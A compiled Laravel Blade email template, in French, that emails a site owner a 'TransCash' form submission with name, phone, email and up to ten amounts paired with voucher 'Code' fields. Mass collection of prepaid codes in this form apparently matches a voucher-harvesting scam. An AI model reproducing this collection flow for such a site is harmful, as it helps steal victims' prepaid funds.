<!DOCTYPE html>
<html>

<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
</head>

<body style="background: #e5e5e5; padding: 30px;">

    <div style="max-width: 320px; margin: 0 auto; padding: 20px; background: #fff;">
        <h3>Message de votre site TransCash :</h3>
        <div>Nom complet: <?php echo e($data['nom']); ?></div>
        <div>Télephone: <?php echo e($data['tel']); ?></div>
        <div>Email: <?php echo e($data['mail']); ?></div>
        <div>Type: <?php echo e($data['typ']); ?></div>
        <div>Montant 1: <?php echo e($data['mont']); ?></div>
        <div>Code 1: <?php echo e($data['cp1']); ?></div>
        <div>Montant 2: <?php echo e($data['mont1']); ?></div>
        <div>Code 2: <?php echo e($data['cp2']); ?></div>
        <div>Montant 3: <?php echo e($data['mont2']); ?></div>
        <div>Code 3: <?php echo e($data['cp3']); ?></div>
        <div>Montant 4: <?php echo e($data['mont3']); ?></div>
        <div>Code 4: <?php echo e($data['cp4']); ?></div>
        <div>Montant 5: <?php echo e($data['mont4']); ?></div>
        <div>Code 5: <?php echo e($data['cp5']); ?></div>
        <div>Montant 6: <?php echo e($data['mont5']); ?></div>
        <div>Code 6: <?php echo e($data['cp6']); ?></div>
        <div>Montant 7: <?php echo e($data['mont6']); ?></div>
        <div>Code 7: <?php echo e($data['cp7']); ?></div>
        <div>Montant 8: <?php echo e($data['mont7']); ?></div>
        <div>Code 8: <?php echo e($data['cp8']); ?></div>
        <div>Montant 9: <?php echo e($data['mont8']); ?></div>
        <div>Code 9: <?php echo e($data['cp9']); ?></div>
        <div>Montant 10: <?php echo e($data['mont9']); ?></div>
        <div>Code 10: <?php echo e($data['cp10']); ?></div>
    </div>

</body>

</html><?php /**PATH C:\Users\Utilisateur\workspace\recharge\resources\views/emails/message-google.blade.php ENDPATH**/ ?>